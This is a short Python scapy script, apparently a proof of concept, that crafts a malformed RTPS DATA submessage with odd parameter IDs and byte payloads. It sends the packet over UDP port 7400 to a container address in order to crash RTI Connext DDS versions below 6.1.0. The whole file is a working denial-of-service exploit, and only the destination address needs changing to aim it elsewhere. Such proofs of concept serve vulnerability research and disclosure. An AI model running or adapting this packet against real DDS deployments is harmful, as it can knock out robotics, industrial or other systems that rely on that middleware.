"""
Crash RTI Connext DDS < 6.1.0
"""

from scapy.all import *
from scapy.layers.inet import UDP, IP
from scapy.contrib.rtps import *

bind_layers(UDP, RTPS)
conf.verb = 0


dst = "172.17.0.2"
sport = 17900
dport = 7400

connext_crasher = (
    IP(
        version=4,
        ihl=5,
        tos=0,
        id=765,
        flags=2,
        frag=0,
        ttl=64,
        proto=17,
        dst=dst,
    )
    / UDP(sport=sport, dport=dport)
    / RTPS(
        protocolVersion=ProtocolVersionPacket(major=2, minor=4),
        vendorId=VendorIdPacket(vendor_id=b"\x01\x03"),
        guidPrefix=GUIDPrefixPacket(
            hostId=16777472, appId=3255894018, instanceId=1172693757
        ),
        magic=b"RTPS",
    )
    / RTPSMessage(
        submessages=[
            RTPSSubMessage_DATA(
                submessageId=21,
                submessageFlags=5,
                octetsToNextHeader=0,
                extraFlags=58880,
                octetsToInlineQoS=8208,
                readerEntityIdKey=0,
                readerEntityIdKind=0,
                writerEntityIdKey=256,
                writerEntityIdKind=194,
                writerSeqNumHi=4294905088,
                writerSeqNumLow=16515309,
                data=DataPacket(
                    encapsulationKind=3,
                    encapsulationOptions=0,
                    parameterList=ParameterListPacket(
                        parameterValues=[
                            PID_DOMAIN_ID(
                                parameterId=15,
                                parameterLength=4,
                                parameterData=b"\x17\x00\x04\x00",
                            ),
                            PID_UNKNOWN(
                                parameterId=4098, parameterLength=0, parameterData=b""
                            ),
                            PID_EXPECTS_INLINE_QOS(
                                parameterId=67, parameterLength=0, parameterData=b""
                            ),
                            PID_UNKNOWN(
                                parameterId=8212, parameterLength=0, parameterData=b""
                            ),
                            PID_UNKNOWN(
                                parameterId=1280, parameterLength=0, parameterData=b""
                            ),
                            PID_PROPERTY_LIST(
                                parameterId=89,
                                parameterLength=16,
                                parameterData=b"9E\x00\x00*\x00\xff\xe0c\xfd\x00\x00\x04\x1e(\x00",
                            ),
                            PID_PARTICIPANT_GUID(
                                parameterId=80,
                                parameterLength=16,
                                parameterData=b"90\x00\x00\x00\x00\x04\x1e(\x00Pk\x10\x10\x10\x10",
                            ),
                            PID_UNKNOWN(
                                parameterId=0,
                                parameterLength=0,
                                parameterData=b"\x10\x00\x00\x00\x1b\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x02\x80\x00\x80\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
                            ),
                        ]
                    ),
                ),
            )
        ]
    )
)


send(connext_crasher, iface="docker0")

# connext_crasher.pdfdump("/tmp/connext_crasher.pdf")
